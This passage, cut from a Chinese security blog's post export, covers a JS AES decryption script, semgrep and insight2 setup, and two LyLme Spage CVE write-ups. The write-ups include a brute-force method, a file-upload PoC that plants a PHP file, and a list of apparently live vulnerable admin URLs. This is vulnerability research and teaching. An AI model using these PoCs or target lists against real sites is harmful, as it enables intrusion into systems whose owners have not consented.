this._Kd.length - 1, r = [0, 0, 0, 0], n = M(e), o = 0; o &lt; 4; o++) n[o] ^= this._Kd[0][o]; for (var a = 1; a &lt; t; a++) &#123; for (o = 0; o &lt; 4; o++) r[o] = v[n[o] &gt;&gt; 24 &amp; 255] ^ _[n[(o + 3) % 4] &gt;&gt; 16 &amp; 255] ^ y[n[(o + 2) % 4] &gt;&gt; 8 &amp; 255] ^ g[255 &amp; n[(o + 1) % 4]] ^ this._Kd[a][o]; n = r.slice() &#125; var s, c = i(16); for (o = 0; o &lt; 4; o++) s = this._Kd[t][o], c[4 * o] = 255 &amp; (f[n[o] &gt;&gt; 24 &amp; 255] ^ s &gt;&gt; 24), c[4 * o + 1] = 255 &amp; (f[n[(o + 3) % 4] &gt;&gt; 16 &amp; 255] ^ s &gt;&gt; 16), c[4 * o + 2] = 255 &amp; (f[n[(o + 2) % 4] &gt;&gt; 8 &amp; 255] ^ s &gt;&gt; 8), c[4 * o + 3] = 255 &amp; (f[255 &amp; n[(o + 1) % 4]] ^ s); return c &#125; , e &#125;() , k = function() &#123; function e(e, t) &#123; this.description = &quot;Cipher Block Chaining&quot;, this.name = &quot;cbc&quot;, this._lastCipherblock = n(t, !0), this._aes = new P(e) &#125; return e.prototype.encrypt = function(e) &#123; if (e = n(e), e.length % 16 !== 0) throw new Error(&quot;invalid size &quot;); for (var t = i(e.length), r = i(16), o = 0; o &lt; e.length; o += 16) &#123; a(e, r, 0, o, o + 16); for (var s = 0; s &lt; 16; s++) r[s] ^= this._lastCipherblock[s]; this._lastCipherblock = this._aes.encrypt(r), a(this._lastCipherblock, t, o) &#125; return t &#125; 找到固定密钥： 根据密钥和加密算法，写对应的解密python脚本12345678910111213141516171819202122232425262728293031323334353637import base64from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpaddef decrypt_encrypted_data(encrypted_base64): # 固定密钥（字节数组） key_bytes = [121, 118, 106, 67, 75, 77, 48, 89, 38, 122, 59, 33, 50, 111, 108, 97] key = bytes(key_bytes) # Base64解码 encrypted_data = base64.b64decode(encrypted_base64) # 取前16字节作为IV iv = encrypted_data[:16] # 剩余部分作为密文 ciphertext = encrypted_data[16:] # 创建AES-CBC解密器 cipher = AES.new(key, AES.MODE_CBC, iv) # 解密并去除填充 decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) # 返回解密后的字符串 return decrypted.decode(&#x27;utf-8&#x27;)# 解密if __name__ == &quot;__main__&quot;: encrypted_data = &quot;EZacB6qmYPlTsOQ8U4AQuZFt/E0sRXzQU9wdmyU5O73XJutsiHuoPVGA7/+ycALt+t6+MoNYfbNL6qVLYSw4EW+VDhazOwGJm9lTlaw4VivSkV+O3Nqjj6Pk8jqRf5dsUwM7itBDMz2oVjFTVrgvfT4Cl+7QgarNX9MHinXQShKLfHhLzyM2z+46O7GDWFSr0JwO3J8ggUnN/m3JD4peOhYrCCKtKFbhxm0gj5aob8fSR8OU+yp2S/bSROcCuOd02MTeX/qX7BBbh6xX2Z29MYPVNp9zKy0ttnsX6fsiMFA=&quot; try: decrypted_text = decrypt_encrypted_data(encrypted_data) print(&quot;解密后的内容:&quot;, decrypted_text) except Exception as e: print(&quot;解密失败:&quot;, str(e)) 碎碎念真的好喜欢GPT的时代，我给他提供思路和我的需求，它来实现具体细节。它分析的过程，也可以给我思路启发，更快的上手学会一个东西。我不用去纠结那些事情的细节，代码的细节，不用去操心具体的实现，只需要专注于事情的主体框架。我真的好喜欢这样的感觉，这才是我的价值。 我的价值不是去死扣细节和缓慢的学习代码，我的价值是我的大脑和我的思维。 我以前的劣势就是，有点强迫症，在学技术细节的时候，会钻牛角，而偏离我的主体框架核心。最后导致事情无法完成，现在就不会这样了，我有想法就去和GPT探讨，根据它给我的思路，我就有了开始学习的方向，在每一个大方向上往前走，再也没有以前那种被困住手脚无法施展的限制感了。","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://gryffinbit.top/tags/JS/"}],"author":"Gryffinbit"},{"title":"代码审计工具 semgrep（macOS m4使用版）","slug":"代码审计工具semgrep","date":"2025-08-13T07:26:33.000Z","updated":"2025-08-13T07:16:29.000Z","comments":true,"path":"2025/08/13/代码审计工具semgrep/","permalink":"https://gryffinbit.top/2025/08/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7semgrep/","excerpt":"","text":"安装过程 项目地址 https://github.com/semgrep/semgrep 注册 https://semgrep.dev/ 进入网页版 本地CI安装 1brew install semgrep 项目扫描 github授权 它在网页版使用的时候，只能扫一些线上仓库中自己的项目，需要进行人工授权 在github中安装app，安装semgrep 的app 在点击扫描项目的时候会有提示，根据提示安装app 扫描项目-线上 从未扫描的项目中，找到自己想要扫描漏洞的项目，开始进行审计 扫描项目-本地 也可以通过CI的方式审计本地项目 进行登陆 1semgrep login 运行之后会进行跳转，从terminal跳转到页面进行认证 在本地进行扫描 12semgrep scan &lt;file&gt;semgrep scan &lt;file&gt; -o result.txt 扫描结果","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"semgrep","slug":"semgrep","permalink":"https://gryffinbit.top/tags/semgrep/"}],"author":"Gryffinbit"},{"title":"漏洞管理平台开发环境部署（基于insight2）","slug":"漏洞管理平台开发环境部署（基于insight2）","date":"2024-11-19T13:26:33.000Z","updated":"2024-11-19T08:57:06.000Z","comments":true,"path":"2024/11/19/漏洞管理平台开发环境部署（基于insight2）/","permalink":"https://gryffinbit.top/2024/11/19/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%88%E5%9F%BA%E4%BA%8Einsight2%EF%BC%89/","excerpt":"","text":"0 x 00 概述该系统采用前后端分离技术，前端使用 VUE 框架，后端使用 Tornado 框架来构建和管理 Web 应用的核心结构，包括处理 HTTP 请求、提供 API 服务和管理后台逻辑。 在 demo 运行时，运行前端生成静态文件，将生成的dist文件夹，放入后端项目文件夹，可预览效果。正常运行时，前后端项目文件一起运行，通过api接口来实现数据的传递。 将项目文件放在ubuntu 虚拟机中实现环境部署，并调通 Ubuntu 的 ssh 远程连接。IDE 选择 pycharm，在 macOS 上实现远程开发。macOS 开发端和 Ubuntu 服务器中的项目文件会同步。 0 x 01 系统版本服务器：ubuntu 20.04 python版本：python3.7 VUE 版本：2.6.10 tornado 版本：5.0 pycharm：PyCharm 2024.3 （professional ）专业版有远程开发的功能 0 x 02 服务器运行环境部署基础依赖 python3.7 安装 安装在了root用户下 123// 添加 PPA 源sudo add-apt-repository ppa:deadsnakes/ppa -y 1sudo apt update 1sudo apt install python3.7 1python3.7 --version 123// 安装额外的工具，例如调试模块、开发者模块、虚拟环境模块、Distutils 模块、lib2to3 工具模块、DBM.GNU 模块和 Tkinter 模块sudo apt install python3.7-dbg python3.7-dev python3.7-venv python3.7-distutils python3.7-lib2to python3.7 安装pip 123wget https://bootstrap.pypa.io/pip/3.7/get-pip.pypython3.7 get-pip.pypip3.7 --version 检查路径是否安装正确 12which python3.7which pip3.7 ssh 安装 1sudo apt-get install openssh-server 状态检查 1sudo systemctl status sshd 修改配置文件，打开root连接和22端口 1vim /etc/ssh/sshd_config 12PermitRootLogin yesport 22 重启 1systemctl restart sshd 给ubuntu 设置系统登录的 root 密码 1sudo passwd 项目文件将项目文件下载到 ubuntu 服务器的项目文件夹下 12345# 前端项目git clone https://github.com/creditease-sec/insight2_front# 后端项目git clone https://github.com/creditease-sec/insight2.git 单独下载sql初始化文件到后端项目文件夹中。 12cd insight2curl -O https://raw.githubusercontent.com/creditease-sec/insight2_docker/refs/heads/master/init/init.sql --ssl-no-revoke 项目依赖后端requirement 1sudo apt install -y build-essential python3-dev libldap2-dev libsasl2-dev libssl-dev libjpeg-dev zlib1g-dev libpng-dev libtiff-dev 12cd insight2pip3.7 install -r requirements.txt mysql 12apt-get install mysql-servernetstat -an|grep 3306 // 确认开启 登录数据库 1234567mysqluse mysql;// 修改密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;密码&#x27;;update user set host = &#x27;%&#x27; where user =&#x27;root&#x27;;FLUSH PRIVILEGES;quit; 重启服务，用新密码进行登录 12service mysql restartmysql -u root -p 进行数据库初始化，初始化后，mysql 的密码变成crediteaseitsec 12cd insight2mysql -u root -p &lt; init.sql 给Ubuntu服务器开启mysql远程连接。找到bind-address &#x3D; 127.0.0.1，然后注释掉这一句，也就是在这句前面加上#号。 12vim /etc/mysql/mysql.conf.d/mysqld.cnf service mysql restart redis 安装 redis 服务 123apt-get install redis-serverps -aux|grep redisnetstat -an|grep 6379 修改密码，改成 crediteaseitsec 1vim /etc/redis/redis.conf 客户端登录 1redis-cli -h 127.0.0.1 -p 6379 -a &#x27;密码&#x27; 前端安装 npm 1sudo apt install nodejs npm 有npm版本要求 12&quot;node&quot;: &quot;&gt;= 4.0.0&quot;,&quot;npm&quot;: &quot;&gt;= 3.0.0&quot; 检查版本 12node -vnpm -v 依赖安装 123456cd insight2_front // 进入目录npm config set registry https://registry.npmjs.org/npm config set strict-ssl falserm package-lock.json npm install node-sass@4.14.1 --unsafe-perm // 可能出现版本问题，单独安装npm install 运行后端 12cd insight2python3.7 run.py --config=settings.py --port=8000 登录信息 12用户名：admin密码：admin!Aa2020 前端 12// 开启服务器，浏览器访问 http://localhost:8080npm run dev 12// 执行构建命令，生成的dist文件夹放在服务器下即可访问npm run build 0 x 03 pycharm 开发环境部署pycharm 连接在pycharm中：设置 -&gt; python interpreter -&gt; add interpreter -&gt; On SSH -&gt; SSH 的连接信息填写 -&gt; 配置python路径、同步文件夹路径等、 连接成功 python路径，选ubuntu上面python3.7的路径 1which python3.7 配置同步目录，意思是本地项目和远程实例中的哪个目录进行关联 （不建议使用默认的&#x2F;tmp目录） 项目文件夹同步 连接数据库数据库密码为crediteaseitsec 之前进行初始化的表，就可以在pycharm中查看了","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"VUE","slug":"VUE","permalink":"https://gryffinbit.top/tags/VUE/"},{"name":"Tornado","slug":"Tornado","permalink":"https://gryffinbit.top/tags/Tornado/"},{"name":"远程开发","slug":"远程开发","permalink":"https://gryffinbit.top/tags/%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"author":"Gryffinbit"},{"title":"insight2管理平台源码方式部署","slug":"insight2管理平台源码方式部署","date":"2024-11-06T18:42:46.000Z","updated":"2024-11-06T06:10:58.000Z","comments":true,"path":"2024/11/07/insight2管理平台源码方式部署/","permalink":"https://gryffinbit.top/2024/11/07/insight2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%BA%90%E7%A0%81%E6%96%B9%E5%BC%8F%E9%83%A8%E7%BD%B2/","excerpt":"","text":"insight2管理平台源码方式部署creditease-sec&#x2F;insight2 部署环境准备服务用docker开启，将端口映射出去，供物理机访问。 requirementpython3.7 1pip install -r requirement.txt mysqlmysql - Official Image | Docker Hub 12345docker pull mysqldocker run -p 3306:3306 --name mysql_docker_insight -e MYSQL_ROOT_PASSWORD=crediteaseitsec -d mysql:8.4docker ps # 检查是否正常开启运行 用pycharm的数据库连接工具，检查是否可以连通 进行初始化 git项目中未给init.sql的文件，从该项目的其他链接中，找到init.sql文件，手动放进去。 https://github.com/creditease-sec/insight2_docker/blob/master/init/init.sql 数据库连接成功后，运行init.sql 成功初始化创建表 redisredis - Official Image | Docker Hub 【Redis】-1.基于docker的两种方式环境搭建redis环境搭建 1.docker方式 1.进入官网 使用文档 - 掘金 123docker pull redisdocker run -d --name redis redis -p 6379:6379 密码默认空 windows python-ldap直接用pip下载会缺少依赖，下载whl包，pip安装whl包。 但是官网和镜像站已无法下载到whl包，可从其他渠道进行下载。 Release v3.4.4 · cgohlke&#x2F;python-ldap-build Django项目无法安装python-ldap依赖解决方案_python-ldap安装失败-CSDN博客 setting项目提供了一个开源的init初始化sql。里面规定了数据库和密码，所以setting.py 需要按照里面的sql语句来进行填写 1234CREATE DATABASE if not exists insight2 character set utf8;ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;crediteaseitsec&#x27;;GRANT All privileges ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;;USE insight2; setting.py配置文件（本地连接）redis密码为空 1234567891011DB_HOST = &#x27;127.0.0.1&#x27;DB_PORT = 3306DB_NAME = &#x27;insight2&#x27;DB_USER = &#x27;root&#x27;DB_PASS = &#x27;crediteaseitsec&#x27;# Redis配置REDIS_HOST = &#x27;127.0.0.1&#x27;REDIS_PORT = 6379REDIS_PASS = &#x27;&#x27;REDIS_DB = 0REDIS_CHANNEL = &quot;SERVICE_CHANNEL&quot; 运行终端运行 1python run.py --config=settings.py --port=8000 也可以在pycharm的运行页面进行配置 运行起来，mysql成功连接时页面 系统页面 登录信息： 12用户名：admin密码：admin!Aa2020 参考文档Ubuntu20.04源码部署洞察 II_洞察二部署教程-CSDN博客 1.3 源码部署 · GitBook","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[],"author":"Gryffinbit"},{"title":"LyLme Spage 身份验证绕过漏洞（CVE-2024-48176）","slug":"LyLmePage 身份验证绕过漏洞","date":"2024-11-06T03:26:33.000Z","updated":"2024-11-06T02:19:37.000Z","comments":true,"path":"2024/11/06/LyLmePage 身份验证绕过漏洞/","permalink":"https://gryffinbit.top/2024/11/06/LyLmePage%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"0 x 00 思路近期看了一些做渗透的同事们的报告，从别人的报告中汲取到了一些黑盒的思路。此次漏洞的挖掘，是黑盒+白盒的过程。 原本我是在复现 Lylme Spage 已经暴露出的一个漏洞，结果登陆的时候，用渗透的思路，发现了一些异常，搭配源代码稍微审计了一下，便挖掘出了该漏洞。是个很浅的登录的设计缺陷，代码非常简单。 这个系统的开发模式很简单，是传统的混合开发模式，将前端和后端逻辑混合在一起处理，代码非常好看懂。暴露在互联网上的资产数量也很多。适合逮住薅更多的漏洞出来。 申请了 CVE。 耶！纪念一下！水洞申请成功！ 0 x 01 漏洞描述LyLme Spage 是一个开源的导航页面，致力于简洁高效无广告的上网导航和搜索入口，支持后台添加链接、自定义搜索引擎等功能。由于 admin/login.php 的登录验证逻辑不够严谨，未设置尝试登录的次数限制，且验证码在登陆失败后不会主动刷新，导致攻击者可以对用户名和密码进行爆破，并登录系统后台。影响的系统版本是 LyLme Spage v1.9.5. 0 x 02 环境搭建系统版本：LyLme Spage v1.9.5fofa 规则：body &#x3D; “LyLme Spage” PHP 版本：7.1.9（PHP 版本需 7.1 及以上，不支持 PHP 8） 前往 GitHub - LyLme&#x2F;lylme_spage: 六零导航页下载 v1.9.5 版本源码压缩包，上传到网站根目录解压。并同步创建数据库 访问 http:&#x2F;&#x2F;域名&#x2F;install 按提示配置数据库进行安装 安装成功 后台地址：http:&#x2F;&#x2F;域名&#x2F;admin 账号密码：admin&#x2F;123456 0 x 03 漏洞验证 进入登录页面 /admin/login.php，输入任意用户名密码及验证码，并抓包 1234567POST /admin/login.php HTTP/1.1Host: lylme:8056Content-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 37user=admin&amp;pass=xxxxxx&amp;authcode=63275 点击刷新验证码，抓包，获取最新验证码 /include/validatecode.php 保持页面不再刷新，对密码部分进行爆破 爆破成功 登陆成功 0 x 04 代码原理混合开发模式（服务器端渲染 + 客户端增强）该系统采用的是传统的混合开发模式，这种开发模式将前端和后端逻辑混合在一起处理，页面在服务器端生成，服务器端使用 PHP 处理业务逻辑并直接输出 HTML 页面，客户端使用少量的 JavaScript 进行交互。页面在服务器端完成渲染，每次用户请求页面时，服务器都会返回一个完整的 HTML 页面。 服务器端渲染（SSR） 页面的主要内容由服务器端（PHP）渲染生成，然后将完整的 HTML 发送给客户端。 客户端增强 在服务器渲染的基础上，使用 JavaScript 或 jQuery 添加一些动态功能，如表单验证、验证码刷新等。 PHP 和 HTML 紧密耦合 PHP 嵌套在 HTML 中，服务器端不仅处理业务逻辑，还负责生成页面的结构和内容。 少量的异步交互 可以通过 AJAX 等方式在前端与后端进行部分数据交互，但核心流程还是基于完整的页面刷新。 PHP 系统中 JS 的作用 简单讲解就是：客户端和页面交互，点击提交表单按钮，触发 js，类似于把数据暂在 js 中，然后 js 会将数据初步处理之后（判断是否为空等）传递给 PHP，让他来做逻辑处理。而 ajax 的作用其实就是，在提交数据的时候，可以异步运行。比如，我只交一个小表单，但是不用刷新整个页面 PHP 是一种服务器端脚本语言，它主要用于生成动态网页内容、处理表单提交、访问数据库等。用户在浏览器访问页面时，PHP 代码会在服务器上执行，生成 HTML 并将其发送到用户的浏览器。JavaScript 是一种客户端脚本语言，它在用户的浏览器中运行，主要用于操作 DOM（文档对象模型）、与用户交互、验证表单、异步加载内容等。 PHP 和 JavaScript 的合作方式 输出 JavaScript 代码 PHP 可以动态生成 JavaScript 代码，并输出到网页中。当浏览器接收到服务器返回的页面时，JavaScript 会在客户端（用户的浏览器）执行。 例如：PHP 可以动态生成 JavaScript 代码，并输出到网页中。当浏览器接收到服务器返回的页面时，JavaScript 会在客户端（用户的浏览器）执行。 12345//PHP 生成了一段包含 JavaScript 的 HTML 页面，当用户访问该页面时，浏览器会弹出一个欢迎框。&lt;?php $username = &quot;User&quot;; echo &quot;&lt;script&gt;alert(&#x27;欢迎 $username!&#x27;);&lt;/script&gt;&quot;;?&gt; PHP 处理用户请求，JavaScript 控制界面 PHP 通常用于处理服务器端的逻辑，比如验证登录信息、存储数据等。 JavaScript 则用于处理客户端的交互，如表单验证或页面的局部更新。 例如：PHP 处理登录请求。JavaScript 验证表单输入，检查输入是否为空或者格式是否正确，避免不必要的服务器请求。 123456789101112131415161718&lt;!-- HTML form --&gt;&lt;form method=&quot;post&quot; action=&quot;login.php&quot; onsubmit=&quot;return validateForm()&quot;&gt; 用户名: &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;br&gt; 密码: &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;&lt;/form&gt;&lt;script&gt;function validateForm() &#123; var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if (username == &quot;&quot; || password == &quot;&quot;) &#123; alert(&quot;用户名和密码不能为空！&quot;); return false; // 阻止表单提交 &#125; return true; // 允许提交&#125;&lt;/script&gt; 通过 AJAX 实现异步数据交互 AJAX 允许使用 JavaScript 进行异步 HTTP 请求，避免页面的完全刷新。这样，PHP 可以处理请求并返回数据，而页面的其他部分保持不变。 例如：用户点击登录按钮后，JavaScript 使用 AJAX 发送登录信息给服务器。PHP 处理请求，并返回成功或错误信息，页面无需刷新即可动态更新结果。 通过 JavaScript 动态加载和处理 PHP 生成的数据 有时，PHP 负责生成数据，而 JavaScript 则负责将这些数据动态呈现给用户。 例如，使用 PHP 生成 JSON 数据，JavaScript 获取这些数据并在前端进行处理。 0 x 05 漏洞分析漏洞产生原因由于 admin/login.php 的登录验证逻辑不够严谨，未设置尝试登录的次数限制，且验证码在登陆失败后不会主动刷新，导致可以对用户名和密码进行爆破。 函数分析登录逻辑1234567891011121314151617181920if (isset($_POST[&#x27;user&#x27;]) &amp;&amp; isset($_POST[&#x27;pass&#x27;])) &#123; if (isset($_REQUEST[&#x27;authcode&#x27;])) &#123; session_start(); if (strtolower($_REQUEST[&#x27;authcode&#x27;]) == $_SESSION[&#x27;authcode&#x27;]) &#123; $user = daddslashes($_POST[&#x27;user&#x27;]); $pass = md5(&#x27;lylme&#x27; . daddslashes($_POST[&#x27;pass&#x27;])); if ($user == $conf[&#x27;admin_user&#x27;] &amp;&amp; $pass == $conf[&#x27;admin_pwd&#x27;]) &#123; $session = md5($user . $pass); $token = authcode(&quot;&#123;$user&#125;\\t&#123;$session&#125;&quot;, &#x27;ENCODE&#x27;, SYS_KEY); setcookie(&quot;admin_token&quot;, $token, time() + 604800, &quot;/&quot;); exit(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;登陆管理中心成功！&#x27;);window.location.href=&#x27;./&#x27;;&lt;/script&gt;&quot;); &#125; elseif ($pass != $conf[&#x27;admin_pwd&#x27;]) &#123; exit(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;用户名或密码不正确！&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125; &#125; else &#123; exit(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;验证码错误&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125; &#125;&#125; 会先验证用户名和密码是否不为空，如果存在的话，进入到验证码的判断逻辑。将用户输入的验证码和 session 中生成的验证码进行对比。如果验证码正确的话，进入用户名和密码的逻辑判断，否则报错验证码错误。 用户名和密码的判断：对用户传入的用户名进行转义处理。对密码进行转义处理后拼接上 lylme 字符串，整体进行 md5 加密。将传入数据与配置中系统预设的用户名和密码进行比对。如果匹配成功，设置 cookie，并返回登陆成功，否则登陆失败返回用户或密码不正确。 JS 客户端互动刷新验证码点击验证码图片时，通过 JavaScript 刷新验证码，并清空验证码输入框的内容。 1234567&lt;img id=&quot;captcha_img&quot; title=&quot;验证码&quot; src=&#x27;../include/validatecode.php&#x27; class=&quot;pull-right code&quot; onclick=&quot;recode()&quot; /&gt;&lt;script&gt; function recode() &#123; $(&#x27;#captcha_img&#x27;).attr(&#x27;src&#x27;, &#x27;../include/validatecode.php?r=&#x27; + Math.random()); $(&quot;input[name=&#x27;authcode&#x27;]&quot;).val(&#x27;&#x27;); &#125;&lt;/script&gt; 通过将一个随机数附加到验证码图片的 URL 中，每次调用函数时都生成一个不同的 URL。这有效避免了浏览器从缓存中加载同一张验证码图片，强制浏览器重新从服务器请求验证码图片，实现验证码的刷新。 0 x 06 案例窄范围 fofa ： body &#x3D; “LyLme Spage” &amp;&amp; body &#x3D; “验证码” &amp;&amp; title &#x3D; “初心导航” https://images.612ch.com/admin/login.php https://fk.612ch.com/admin/login.php https://wxapi.612ch.com/admin/login.php https://iloveyouyq.612ch.com/admin/login.php https://lwh.612ch.com/admin/login.php","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"Lylme Spage","slug":"Lylme-Spage","permalink":"https://gryffinbit.top/tags/Lylme-Spage/"}],"author":"Gryffinbit"},{"title":"LyLme Spage 文件上传漏洞分析（CVE-2024-34982）","slug":"LyLme Page 文件上传漏洞（CVE-2024-34982）","date":"2024-08-20T03:26:33.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2024/08/20/LyLme Page 文件上传漏洞（CVE-2024-34982）/","permalink":"https://gryffinbit.top/2024/08/20/LyLme%20Page%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-34982%EF%BC%89/","excerpt":"","text":"0 x 01 漏洞描述LyLme Spage 是一个开源的导航页面，致力于简洁高效无广告的上网导航和搜索入口，支持后台添加链接、自定义搜索引擎等功能。该系统在 file. php 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码、写入后门、获取服务器权限，进而控制整个 web 服务器。 漏洞影响范围：LyLme Spage v 1.9.5漏洞编号：CVE-2024-34982fofa 规则：body&#x3D;”LyLme Spage” 0 x 02 环境搭建PHP 版本：7.1.9（PHP 版本需 7.1 及以上，不支持 PHP 8） 前往 GitHub - LyLme&#x2F;lylme_spage: 六零导航页下载最新版本源码压缩包，上传到网站根目录解压 访问http:&#x2F;&#x2F;域名&#x2F;install 按提示配置数据库进行安装 安装成功 后台地址：http:&#x2F;&#x2F;域名&#x2F;admin 账号密码：admin&#x2F;123456 0 x 03 漏洞复现12345678910111213POST /include/file.php HTTP/1.1Host: lylme:8056Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8jtzH8vknAlAu8DoContent-Length: 198------WebKitFormBoundary8jtzH8vknAlAu8DoContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: image/png&lt;?php phpinfo();?&gt;------WebKitFormBoundary8jtzH8vknAlAu8Do-- php 文件，上传为 PNG 格式，发包时修改文件后缀，修改为 php 文件。访问给出的 URL 地址，可解析 php 文件 0 x 04 漏洞分析 定位漏洞文件 漏洞文件，位于 /include/file. php 也可以根据相应包的内容进行全局搜索。 文件验证漏洞点 123456789101112131415161718192021222324252627282930function upload_img($upfile)&#123; $IMG_NAME = uniqid(&quot;img_&quot;); //文件名 $maxsize = pow(1024, 2) * 5; //文件大小5M $dir = ROOT . SAVE_PATH . &#x27;upload/&#x27;; if (!is_dir($dir)) &#123; mkdir($dir, 0755, true); //创建路径 &#125; $type = $upfile[&quot;type&quot;]; $size = $upfile[&quot;size&quot;]; $tmp_name = $upfile[&quot;tmp_name&quot;]; if (!validate_file_type($type)) &#123; exit(&#x27;&#123;&quot;code&quot;: &quot;-4&quot;,&quot;msg&quot;:&quot;上传的图片类型不支持&quot;&#125;&#x27;); &#125; $parts = explode(&#x27;.&#x27;, $upfile[&quot;name&quot;]); $img_ext = &quot;.&quot; . end($parts); if ($size &gt; $maxsize) &#123; exit(&#x27;&#123;&quot;code&quot;: &quot;-1&quot;,&quot;msg&quot;:&quot;图片不能超过&#x27; . $maxsize / pow(1024, 2) . &#x27;M&quot;&#125;&#x27;); &#125; $img_name = $IMG_NAME . $img_ext; //文件名 $save_to = $dir . $img_name; $url = &#x27;/&#x27; . SAVE_PATH . &#x27;upload/&#x27; . $img_name; if (move_uploaded_file($tmp_name, $dir . $img_name)) &#123; echo(&#x27;&#123;&quot;code&quot;: &quot;200&quot;,&quot;msg&quot;:&quot;上传成功&quot;,&quot;url&quot;:&quot;&#x27; . $url . &#x27;&quot;&#125;&#x27;); return $dir . $img_name; &#125;&#125; 通过 validate_file_type() 函数对文件的类型进行判断。 1234567891011121314151617181920212223function validate_file_type($type)&#123; switch ($type) &#123; case &#x27;jpeg&#x27;: $type = &#x27;image/jpeg&#x27;; break; case &#x27;jpg&#x27;: $type = &#x27;image/jpeg&#x27;; break; case &#x27;png&#x27;: $type = &#x27;image/png&#x27;; break; case &#x27;gif&#x27;: $type = &#x27;image/gif&#x27;; break; case &#x27;ico&#x27;: $type = &#x27;image/x-icon&#x27;; break; &#125; $allowed_types = array(&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;, &quot;image/x-icon&quot;); return in_array($type, $allowed_types);&#125; 从 $_FILES[&quot;file&quot;] 中获取数组中的 type 字段。然后与白名单数组中的内容进行对比。只要符合白名单中的，便可以顺利上传 12345678if (empty($_POST[&quot;url&quot;]) &amp;&amp; !empty($_FILES[&quot;file&quot;])) &#123; $filename = upload_img($_FILES[&quot;file&quot;]); if (isset($islogin) == 1 &amp;&amp; $_GET[&quot;crop&quot;] == &quot;no&quot;) &#123; //不压缩图片 exit(); &#125; //上传图片&#125; 由此可见，在判断类型时，它只对 Content-Type: image/png 部分进行了白名单的筛选。 0 x 05 POC 构造由于只对 Content-Type: image&#x2F;png 进行检测，所以修改 filename 即可，改为 php 文件。 12345678910111213POST /include/file.php HTTP/1.1Host: lylme:8056Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8jtzH8vknAlAu8DoContent-Length: 198------WebKitFormBoundary8jtzH8vknAlAu8DoContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: image/png&lt;?php phpinfo();?&gt;------WebKitFormBoundary8jtzH8vknAlAu8Do-- 0 x 06 修复方案对 filename，content 都进行检测 0 x 07 参考链接CVE&#x2F;Lylme_pagev1.9.5.md at main · n2ryx&#x2F;CVE · GitHub","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Gryffinbit"},{"title":"htmly CMS XSS 漏洞分析","slug":"htmly-CMS-XSS-漏洞分析","date":"2024-08-16T09:39:26.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/16/htmly-CMS-XSS-漏洞分析/","permalink":"https://gryffinbit.top/2024/08/16/htmly-CMS-XSS-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"0x01 漏洞描述HTMLy 是一个开源的基于 PHP 的博客平台。它可以让用户创建安全、轻量且功能强大的网站或博客，并且即使在拥有数千篇文章的情况下，也能高效扩展​。该系统存在存储型XSS漏洞，由于xxx.php 文件中的xxx函数 对用户传入的数据没有进行严格过滤，导致用户可以在新建文章时写入恶意的攻击代码，由此触发XSS攻击。 0x02 环境搭建版本信息通过phpstudy 进行搭建php：7.1.9apache：2.4.39htmly版本：2.9.9 最新版本 安装htmly 也可以直接下载installer.php 进行一键安装，默认下载最新版本 下载源码 Release Composer Vendor Update and 